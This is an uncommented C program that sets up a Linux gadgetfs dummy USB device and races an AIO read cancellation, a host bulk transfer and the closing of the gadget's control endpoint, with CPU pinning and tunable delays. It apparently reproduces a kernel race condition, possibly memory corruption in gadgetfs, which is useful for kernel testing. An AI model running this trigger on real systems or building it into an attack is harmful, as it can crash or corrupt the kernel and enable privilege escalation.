#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/aio_abi.h>
#include <linux/usb/ch9.h>
#include <linux/usbdevice_fs.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>

#define EP0_PATH "/dev/gadget/dummy_udc"
#define EP_OUT_PATH "/dev/gadget/ep1out-bulk"
#define LEN (1024*1024)
#define HOST_XFER 512
struct ep7{uint8_t bLength,bDescriptorType,bEndpointAddress,bmAttributes;uint16_t wMaxPacketSize;uint8_t bInterval;}__attribute__((packed));
struct desc_blob{uint32_t tag;struct usb_config_descriptor cfg;struct usb_interface_descriptor intf;struct ep7 ep_out;struct ep7 ep_in;struct usb_device_descriptor dev;}__attribute__((packed));
struct ep_msg{uint32_t tag;struct ep7 ep;}__attribute__((packed));
static aio_context_t ctx; static struct iocb cb; static int usbfd=-1; static atomic_int ep0_global,host_go,host_done,cancel_go,unbind_go; static long host_delay_ns=0,cancel_delay_ns=0,unbind_delay_ns=2000000; static int cancel_burst=1,close_fd_early=0; static atomic_ulong cancel_ok,cancel_err;
static long xio_setup(unsigned nr,aio_context_t*c){return syscall(SYS_io_setup,nr,c);}static long xio_destroy(aio_context_t c){return syscall(SYS_io_destroy,c);}static long xio_submit(aio_context_t c,long nr,struct iocb**p){return syscall(SYS_io_submit,c,nr,p);}static long xio_cancel(aio_context_t c,struct iocb*iocb,struct io_event*ev){return syscall(SYS_io_cancel,c,iocb,ev);}static long xio_getevents(aio_context_t c,long min,long nr,struct io_event*ev,struct timespec*to){return syscall(SYS_io_getevents,c,min,nr,ev,to);}static void nsleep(long ns){struct timespec ts={ns/1000000000L,ns%1000000000L};while(nanosleep(&ts,&ts)&&errno==EINTR){}}static void busy_delay(long ns){if(ns<=0)return;struct timespec a,b;clock_gettime(CLOCK_MONOTONIC_RAW,&a);for(;;){clock_gettime(CLOCK_MONOTONIC_RAW,&b);long d=(b.tv_sec-a.tv_sec)*1000000000L+(b.tv_nsec-a.tv_nsec);if(d>=ns)break;}}static void pin_cpu(int cpu){cpu_set_t s;CPU_ZERO(&s);CPU_SET(cpu,&s);sched_setaffinity(0,sizeof(s),&s);}
static int write_device_desc(int fd){struct desc_blob d;memset(&d,0,sizeof(d));d.cfg.bLength=USB_DT_CONFIG_SIZE;d.cfg.bDescriptorType=USB_DT_CONFIG;d.cfg.wTotalLength=USB_DT_CONFIG_SIZE+USB_DT_INTERFACE_SIZE+2*sizeof(struct ep7);d.cfg.bNumInterfaces=1;d.cfg.bConfigurationValue=1;d.cfg.bmAttributes=USB_CONFIG_ATT_ONE;d.cfg.bMaxPower=1;d.intf.bLength=USB_DT_INTERFACE_SIZE;d.intf.bDescriptorType=USB_DT_INTERFACE;d.intf.bInterfaceNumber=0;d.intf.bNumEndpoints=2;d.intf.bInterfaceClass=0xff;d.ep_out.bLength=sizeof(struct ep7);d.ep_out.bDescriptorType=USB_DT_ENDPOINT;d.ep_out.bEndpointAddress=1;d.ep_out.bmAttributes=USB_ENDPOINT_XFER_BULK;d.ep_out.wMaxPacketSize=64;d.ep_in.bLength=sizeof(struct ep7);d.ep_in.bDescriptorType=USB_DT_ENDPOINT;d.ep_in.bEndpointAddress=0x81;d.ep_in.bmAttributes=USB_ENDPOINT_XFER_BULK;d.ep_in.wMaxPacketSize=64;d.dev.bLength=USB_DT_DEVICE_SIZE;d.dev.bDescriptorType=USB_DT_DEVICE;d.dev.bcdUSB=0x0200;d.dev.bDeviceClass=USB_CLASS_VENDOR_SPEC;d.dev.bMaxPacketSize0=64;d.dev.idVendor=0x1d6b;d.dev.idProduct=0x0104;d.dev.bcdDevice=1;d.dev.bNumConfigurations=1;ssize_t n=write(fd,&d,sizeof(d));if(n!=(ssize_t)sizeof(d)){fprintf(stderr,"dev_desc write=%zd errno=%d\n",n,errno);return-1;}return 0;}
static void prep_perms(void){for(int i=0;i<200;i++){if(access(EP_OUT_PATH,F_OK)==0){chown(EP_OUT_PATH,1000,1000);chmod(EP_OUT_PATH,0666);return;}nsleep(5000000L);}}
static int enable_out_ep(int fd){struct ep_msg m;memset(&m,0,sizeof(m));m.tag=1;m.ep.bLength=sizeof(struct ep7);m.ep.bDescriptorType=USB_DT_ENDPOINT;m.ep.bEndpointAddress=1;m.ep.bmAttributes=USB_ENDPOINT_XFER_BULK;m.ep.wMaxPacketSize=64;ssize_t n=write(fd,&m,sizeof(m));if(n!=(ssize_t)sizeof(m)){fprintf(stderr,"out ep_desc write=%zd errno=%d\n",n,errno);return-1;}return 0;}
static int read_trim(const char*path,char*out,size_t n){int fd=open(path,O_RDONLY);if(fd<0)return-1;ssize_t r=read(fd,out,n-1);close(fd);if(r<=0)return-1;out[r]=0;while(r>0&&(out[r-1]=='\n'||out[r-1]==' ')){out[--r]=0;}return 0;}
static int open_usbfs_dev(void){DIR*d=opendir("/sys/bus/usb/devices");if(!d){perror("opendir usb");return-1;}struct dirent*de;char path[256],vid[32],pid[32],bus[32],dev[32];int fd=-1;while((de=readdir(d))){if(de->d_name[0]=='.')continue;snprintf(path,sizeof(path),"/sys/bus/usb/devices/%s/idVendor",de->d_name);if(read_trim(path,vid,sizeof(vid)))continue;snprintf(path,sizeof(path),"/sys/bus/usb/devices/%s/idProduct",de->d_name);if(read_trim(path,pid,sizeof(pid)))continue;if(strcmp(vid,"1d6b")||strcmp(pid,"0104"))continue;snprintf(path,sizeof(path),"/sys/bus/usb/devices/%s/busnum",de->d_name);if(read_trim(path,bus,sizeof(bus)))continue;snprintf(path,sizeof(path),"/sys/bus/usb/devices/%s/devnum",de->d_name);if(read_trim(path,dev,sizeof(dev)))continue;char node[128];snprintf(node,sizeof(node),"/dev/bus/usb/%03d/%03d",atoi(bus),atoi(dev));chmod(node,0666);fd=open(node,O_RDWR|O_CLOEXEC);fprintf(stderr,"usbfs node=%s fd=%d errno=%d\n",node,fd,errno);break;}closedir(d);if(fd>=0){int ifc=0;int cr=ioctl(fd,USBDEVFS_CLAIMINTERFACE,&ifc);fprintf(stderr,"claim if0=%d errno=%d\n",cr,errno);}return fd;}
static void*host_thread(void*arg){(void)arg;pin_cpu(1);while(!atomic_load(&host_go)){}busy_delay(host_delay_ns);unsigned char data[HOST_XFER];memset(data,'H',sizeof(data));struct usbdevfs_bulktransfer bt;memset(&bt,0,sizeof(bt));bt.ep=1;bt.len=HOST_XFER;bt.timeout=1000;bt.data=data;int r=ioctl(usbfd,USBDEVFS_BULK,&bt);fprintf(stderr,"host bulk ret=%d errno=%d\n",r,errno);atomic_store(&host_done,1);return NULL;}
static void*cancel_thread(void*arg){(void)arg;pin_cpu(0);while(!atomic_load(&cancel_go)){}busy_delay(cancel_delay_ns);for(int i=0;i<cancel_burst;i++){struct io_event ev;memset(&ev,0,sizeof(ev));long r=xio_cancel(ctx,&cb,&ev);if(r==0)atomic_fetch_add(&cancel_ok,1);else atomic_fetch_add(&cancel_err,1);if((i&15)==15)nsleep(1000);}fprintf(stderr,"cancel_done ok=%lu err=%lu\n",atomic_load(&cancel_ok),atomic_load(&cancel_err));return NULL;}
static void*unbind_thread(void*arg){(void)arg;pin_cpu(2);while(!atomic_load(&unbind_go)){}busy_delay(unbind_delay_ns);int fd=atomic_exchange(&ep0_global,-1);if(fd>=0)close(fd);return NULL;}
int main(int argc, char **argv)
{
	setvbuf(stderr, NULL, _IONBF, 0);
	pin_cpu(3);
	if (argc > 1)
		host_delay_ns = atol(argv[1]);
	if (argc > 2)
		unbind_delay_ns = atol(argv[2]);
	if (argc > 3)
		cancel_delay_ns = atol(argv[3]);
	if (argc > 4)
		close_fd_early = atoi(argv[4]) != 0;

	int ep0 = open(EP0_PATH, O_RDWR | O_CLOEXEC);
	if (ep0 < 0) {
		perror("open ep0");
		return 1;
	}
	atomic_store(&ep0_global, ep0);
	if (write_device_desc(ep0))
		return 2;
	nsleep(1000000000L);
	prep_perms();
	usbfd = open_usbfs_dev();
	if (usbfd < 0)
		return 3;
	if (setgid(1000) || setuid(1000)) {
		perror("drop uid");
		return 20;
	}
	fprintf(stderr, "after_drop uid=%d euid=%d hdelay=%ld udelay=%ld\n",
		getuid(), geteuid(), host_delay_ns, unbind_delay_ns);

	int epfd = open(EP_OUT_PATH, O_RDWR | O_CLOEXEC);
	if (epfd < 0) {
		perror("open epout");
		return 4;
	}
	if (enable_out_ep(epfd))
		return 5;
	if (xio_setup(64, &ctx) < 0) {
		perror("io_setup");
		return 6;
	}

	unsigned char *buf = aligned_alloc(64, LEN);
	unsigned char *buf2 = aligned_alloc(64, LEN);
	if (!buf || !buf2)
		return 7;
	memset(buf, 0, LEN);
	memset(buf2, 0, LEN);
	struct iovec iov[2] = {
		{ .iov_base = buf, .iov_len = LEN / 2 },
		{ .iov_base = buf2, .iov_len = LEN - LEN / 2 },
	};

	memset(&cb, 0, sizeof(cb));
	cb.aio_data = (uint64_t)(uintptr_t)&cb;
	cb.aio_fildes = epfd;
	cb.aio_lio_opcode = IOCB_CMD_PREADV;
	cb.aio_buf = (uint64_t)(uintptr_t)iov;
	cb.aio_nbytes = 2;
	struct iocb *list[1] = { &cb };
	long submitted = xio_submit(ctx, 1, list);
	fprintf(stderr, "submit=%ld errno=%d\n", submitted, errno);
	if (submitted != 1)
		return 8;
	if (close_fd_early) {
		close(epfd);
		epfd = -1;
		fprintf(stderr, "endpoint fd closed after submit\n");
	}

	pthread_t host, unbind, cancel;
	if (pthread_create(&host, NULL, host_thread, NULL) != 0)
		return 9;
	if (pthread_create(&unbind, NULL, unbind_thread, NULL) != 0)
		return 10;
	if (pthread_create(&cancel, NULL, cancel_thread, NULL) != 0)
		return 11;
	atomic_store(&host_go, 1);
	while (!atomic_load(&host_done))
		sched_yield();
	atomic_store(&cancel_go, 1);
	atomic_store(&unbind_go, 1);

	struct io_event event;
	memset(&event, 0, sizeof(event));
	struct timespec timeout = { .tv_sec = 2, .tv_nsec = 0 };
	long got = xio_getevents(ctx, 1, 1, &event, &timeout);
	fprintf(stderr, "getevents=%ld res=%lld first=%02x second=%02x\n",
		got, (long long)event.res, buf[0], buf2[0]);

	pthread_join(host, NULL);
	pthread_join(unbind, NULL);
	pthread_join(cancel, NULL);
	if (epfd >= 0)
		close(epfd);
	int ep0_left = atomic_exchange(&ep0_global, -1);
	if (ep0_left >= 0)
		close(ep0_left);
	close(usbfd);
	xio_destroy(ctx);
	free(buf);
	free(buf2);
	return 0;
}
